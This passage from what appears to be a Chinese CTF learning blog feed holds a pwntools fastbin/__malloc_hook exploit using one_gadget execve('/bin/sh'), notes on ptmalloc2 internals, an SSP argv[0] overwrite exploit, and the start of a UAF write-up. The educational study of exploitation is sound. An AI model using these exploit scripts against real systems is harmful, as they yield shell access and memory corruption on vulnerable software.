class="string">"malloc_hook: "</span>,hex(malloc_hook)</span><br><span class="line">offset = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base: "</span>,hex(offset)</span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">0</span>)      <span class="comment"># 重新再free idx：0 此时在fastbin里，注意，此时不delet 2 而是 delet 0，两个指向的是一样的，但是如果delet 2 会造成size清空导致无法edit</span></span><br><span class="line"></span><br><span class="line">p1 = flat(p64(malloc_hook<span class="number">-0x23</span>))    </span><br><span class="line">edit(io,<span class="number">2</span>,p1)   <span class="comment"># 编辑idx：2，此时这个块已经在fastbin里了，相当于直接改了fd指针。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(io)</span></span><br><span class="line"></span><br><span class="line">add(io,<span class="number">0x60</span>,<span class="string">'a'</span>)     <span class="comment"># 再申请0x60，又返回了fastbin里的chunk，此时fastbin指向fake chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ogg = <span class="number">0x4526a</span></span><br><span class="line">p2 = flat(<span class="string">'\x00'</span>*<span class="number">0xB</span>,p64(ogg+offset),p64(offset+libc.sym[<span class="string">'realloc'</span>]+<span class="number">0x10</span>))    <span class="comment"># 0xB刚好到达__realloc_hook,改reallochook为ogg，改malloc为reallochook+偏移 此时调整栈空间</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"realloc hook+0ffset: "</span>,hex(offset+libc.sym[<span class="string">'realloc'</span>]+<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ogg+offset: "</span>,hex(ogg+offset)</span><br><span class="line">add(io,<span class="number">0x60</span>,p2)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#pydebug(io)</span></span><br><span class="line"><span class="comment">#delt(io,3)</span></span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>TaL第一次周赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ptmalloc2学习_1</title>
    <link href="/2020/06/02/ptmalloc2%E5%AD%A6%E4%B9%A0-1/"/>
    <url>/2020/06/02/ptmalloc2%E5%AD%A6%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-写在前面"><a href="#0x0-写在前面" class="headerlink" title="0x0 写在前面"></a>0x0 写在前面</h2><ul><li>最近状态特别不好，感觉很累又没什么动力，可能也是前一段时间熬夜太多了。昨天跟学长交流了一下，觉得自己还是要专心补一下基础部分，尤其是在接触了堆以后，基础真的很重要。。所以就开一个ptmalloc学习的坑，希望能好好督促自己。主要我还是太菜了。校赛输出也是倒一，全靠队友带飞。不过我是爱二进制的，也希望自己可以好好坚持。跟外校的大佬们比真的太菜了。。</li><li>关于如何学习ptmlloac2，我是这样想的，如果直接去硬刚源码，也有一些枯燥乏味，对于我可能不是有效的方法。我准备以解决问题为导向，然后对于要解决的问题深入分析源码，我个人觉得是比较合适的。</li></ul><h2 id="0x1-什么是ptmalloc2"><a href="#0x1-什么是ptmalloc2" class="headerlink" title="0x1 什么是ptmalloc2"></a>0x1 什么是ptmalloc2</h2><ul><li><em>This is the memory manager used by GNU C library on Linux. The library glibc has a global “struct malloc_state” object, named main_arena, which is the root of all managed heap memory.</em></li><li><em>ptmalloc 实现了 malloc()，free()以及一组其它的函数. 以提供动态内存管理的支持。分 配器处在用户程序和内核之间，它响应用户的分配请求，向操作系统申请内存，然后将其返 回给用户程序，为了保持高效的分配，分配器一般都会预先分配一块大于用户请求的内存， 并通过某种算法管理这块内存。来满足用户的内存分配要求，用户释放掉的内存也并不是立 即就返回给操作系统，相反，分配器会管理这些被释放掉的空闲空间，以应对用户以后的内 存分配要求。也就是说，分配器不但要管理已分配的内存块，还需要管理空闲的内存块，当 响应用户分配要求时，分配器会首先在空闲空间中寻找一块合适的内存给用户，在空闲空间 中找不到的情况下才分配一块新的内存。为实现一个高效的分配器，需要考虑很多的因素。 比如，分配器本身管理内存块所占用的内存空间必须很小，分配算法必须要足够的快。</em></li><li>简单的说，ptmalloc作为linux中的一个堆分配，管理的“装置”，可以通过不同的管理策略与算法满足用户、操作系统对于堆内存的分配、管理需求。</li><li>但是由于ptmalloc2的一些固有的内在逻辑的问题，我们可以针对这些漏洞进行堆上的攻击，包括但不仅限于：<img src="https://s1.ax1x.com/2020/06/02/tYxCU1.png" alt=""></li></ul><h2 id="0x2-main-arena是什么？他在干嘛？"><a href="#0x2-main-arena是什么？他在干嘛？" class="headerlink" title="0x2 main_arena是什么？他在干嘛？"></a>0x2 main_arena是什么？他在干嘛？</h2><h3 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h3><p>最先看到main_arena是在一个堆题中，拿到&lt;main_arena+88&gt;然后反推heap_base。当时那个chunk应该是在unsortedbin里。然后我尝试打印了一下main_arena，发现输出了很多的变量。类似于这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p main_arena</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x0, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dd1b20 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x0, </span><br><span class="line">    max_system_mem &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原问题在<a href="https://stackoverflow.com/questions/37960788/why-there-isnt-main-arena-in-libc-so-symbol-table-while-there-is-one-in-malloc" target="_blank" rel="noopener">stackoverflow</a></p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ul><li><strong>什么是main_arena和non_main_arena(dynamic_arena)</strong>：可以说main_arena是堆内存的根。或者叫做一个进程的<strong>主分配区</strong>，当然了，有主分配区就有<strong>非主分配区</strong>，Glibc的malloc可以支持多线程，主分配区和非主分配区形成一个<strong>环形链表</strong>进行管理。每一个分配区使用互斥锁使多线程对于该分配区的访问互斥。<img src="https://s1.ax1x.com/2020/06/02/ttmLwt.png" alt=""></li><li><strong>主分配区与非主分配区的区别</strong>：主要在于他们是如何向kernel请求内存的，main_arena主要调用sbrk()；non_main_arena<strong>只</strong>调用mmap(). 而sbrk()分配的内存直接从<code>programm break</code>连续向上开，或者说是连着（相邻）数据段的；而mmap()主要用于动态分配的arena（non_main_arena）mmap()可以指定分配的位置和大小、权限等。自然就不一定是连着program break了。<img src="https://s1.ax1x.com/2020/06/02/ttmRdx.png" alt=""></li><li><strong>什么使用用主分配区什么时候非主</strong>：由于非主分配区采用mmap拿内存，且是有一个固定的大小的比如64MB，所以这就导致，当用户向非主分配区请求分配内存时再切成小块“零售”出去。调用效率是比较低的，接从用户空间分配内存效率会比较高。所以ptmalloc在必要的情况下才会调用mmap()向操作系统申请内存。</li></ul><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考malloc.h和malloc.c  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Internal routines, operating on "arenas".  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">mstate</span>;</span></span><br></pre></td></tr></table></figure><p>在malloc.c中,就是main_arena的真正数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 锁*/</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line">  <span class="keyword">long</span> pad0_[<span class="number">1</span>]; <span class="comment">/* try to give the mutex its own cacheline */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The maximum chunk size to be eligible for fastbin */</span></span><br><span class="line">  INTERNAL_SIZE_T  max_fast;   <span class="comment">/* low 2 bits used as flags */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS]; <span class="comment">//fastbins的管理头</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;  <span class="comment">//切割后剩下的chunk链接到last_remainder</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     binmap[BINMAPSIZE];  <span class="comment">//位图，标识该bit对应的bin中是否包含空闲的chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">//指向下一个arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;       <span class="comment">//记录当前分配区已经分配的内存大小</span></span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;   <span class="comment">//记录当前分配区最大能分配的内存大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中mchunkptr、mfastbinptr是指向这个结构体(实际就是chunk本体<a href="#1">malloc_chunk详细</a>)的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      <span class="built_in">size</span>;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来定义了main_arena。<code>static struct malloc_state main_arena;</code></p><h3 id="总结一下main-arena"><a href="#总结一下main-arena" class="headerlink" title="总结一下main_arena"></a>总结一下main_arena</h3><ul><li>集中管理bins链的结构体，使用含fd和bk的bin头一对一管理各个free的chunk</li><li>分释放配堆块是基于main_arena来寻址的，首先找的是fastbin，其次再找bins</li><li>main_arena存储在libc上，用以管理所有bins的头和尾，每个bins链头的fd和尾的bk与之连接</li></ul><p><span id = "1">malloc_chunk详细</span></p><ul><li>在程序的执行过程中，我们称malloc申请的内存为chunk。这块内存在ptmalloc内部用malloc_chunk结构体来表示。</li><li>当程序申请的chunk被free后，会被加入到相应的空闲管理列表中。</li><li>无论一个chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。但根据是否被释放，结构会有所更改。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag' method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk, if allocated            | |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .             (malloc_usable_space() bytes)                     .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of chunk                                     |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Where "chunk" is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but "mem" is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  "Nextchunk" is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk                            |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:' |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:' |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot' of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The two exceptions to all this are</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1. The special chunk `top' doesn't bother using the</span></span><br><span class="line"><span class="comment">        trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">        that would have to index off it. After initialization, `top'</span></span><br><span class="line"><span class="comment">        is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">        MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">        bit (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">        allocated one-by-one, each must contain its own trailing size field.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A:倒数第三位表示当前chunk属于主分配区(0)还是非主分配区(1)</span></span><br><span class="line"><span class="comment"> M:倒数第二位表示当前chunk是从mmap(1)[多线程]分配的，还是从brk(0)[子线程]分配的</span></span><br><span class="line"><span class="comment"> P:最低为表示前一块是否在使用中</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>ptmalloc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ptmalloc2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>主动SSP覆盖argv[0]</title>
    <link href="/2020/05/22/%E4%B8%BB%E5%8A%A8SSP%E8%A6%86%E7%9B%96argv-0/"/>
    <url>/2020/05/22/%E4%B8%BB%E5%8A%A8SSP%E8%A6%86%E7%9B%96argv-0/</url>
    
    <content type="html"><![CDATA[<p><del>日常刷题，马上Jarvis的就刷完啦！准备转战buuoj，加油。</del></p><h2 id="0x01-题目概览"><a href="#0x01-题目概览" class="headerlink" title="0x01 题目概览"></a>0x01 题目概览</h2><ul><li>64位程序，开了canary，去掉了符号表<img src="https://s1.ax1x.com/2020/05/22/YX7lPs.png" alt=""></li><li>使用gets进行读取，可以进行栈溢出，溢出后触发stack smashing</li><li>这个地方很有意思。先看一下发现题目中有个flag。<img src="https://s1.ax1x.com/2020/05/22/YX7yM6.png" alt="">)但是有一个问题是这里<img src="https://s1.ax1x.com/2020/05/22/YX7HL8.png" alt="">)如果程序正常执行到这里，flag会被改掉，那么实际上这个位置的flag就不能用了，这里有一个知识点:<strong>当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下</strong>，查找一下，果然在0x400d21有备份。<img src="https://s1.ax1x.com/2020/05/22/YXHwm8.png" alt="">,我们选择用这个备份来打。</li></ul><h2 id="0x02-攻击思路"><a href="#0x02-攻击思路" class="headerlink" title="0x02 攻击思路"></a>0x02 攻击思路</h2><ul><li>其实思路很朴素，已知当我们主动出发SSP时，程序会输出argv[0],那么我们只要把argv[0]改成flag的地址就行了。</li><li>接下来调一下填充的长度<img src="https://s1.ax1x.com/2020/05/22/YXqxWd.png" alt="">)这是我们要改掉的地址，距离<img src="https://s1.ax1x.com/2020/05/22/YXLVYQ.png" alt=""></li><li>我们只要把这个地址换成flag的备份地址就ok</li></ul><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io = process(<span class="string">"./smashes"</span>)</span><br><span class="line">payload = flat(<span class="string">'a'</span>*<span class="number">0x218</span>,p64(<span class="number">0x400d21</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">"a"</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Canary &amp;&amp; argv[0]</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack</title>
    <link href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/"/>
    <url>/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-知识点概览"><a href="#0x00-知识点概览" class="headerlink" title="0x00 知识点概览"></a>0x00 知识点概览</h2><ul><li>fastbin结构，fd指针</li><li>UAF的原理</li><li>one_gadget<h2 id="0x01-题目概览"><a href="#0x01-题目概览" class="headerlink" title="0x01 题目概览"></a>0x01 题目概览</h2><img src="https://s1.ax1x.com/2020/05/21/YqxP0K.png" alt=""></li><li>他这个实际上就是模拟了linux下的几个操作：vim、cat、rm之类的，然后在这背后实际上vim是新开一个堆（有两种，vim 2开0x30的小chunk；vim 1开0x60的大chunk）。然后rm就是free，<strong>不过free后没有置空，给了我们UAF的机会</strong> <img src="https://s1.ax1x.com/2020/05/21/Yqx3tg.png" alt=""></li><li>有一个需要格外注意的一点，这里有一个格式化字符串，可以用来泄漏地址。<img src="https://s1.ax1x.com/2020/05/21/YqxI4e.png" alt=""> 但由于他的过滤我们实际只能用%p来泄漏，而这个格式化字符串触发的前提是format == NULL,而format是vim 1的返回值。这就要求我们在vim 1之前先去vim 2然后输入%p再cat 2来泄漏一下地址，这个泄漏出的地址实际上是<code>&lt;_IO_2_1_stdin_+131&gt;</code>，在某次调试中他距离libc基地址的偏移是0x3c4963。由此我们可以拿到加载时libc的基地址。（关于这个函数是干嘛的请看<a href="https://book.51cto.com/art/201701/528133.htm?mobile" target="_blank" rel="noopener">stdin、stdout和stderr</a>）  <img src="https://s1.ax1x.com/2020/05/21/YLSte0.png" alt=""></li><li>这个程序有两个可以打的地方：1.one_gadget 2.secret函数。我们这里基于one_gadget <img src="https://s1.ax1x.com/2020/05/21/YLCme1.png" 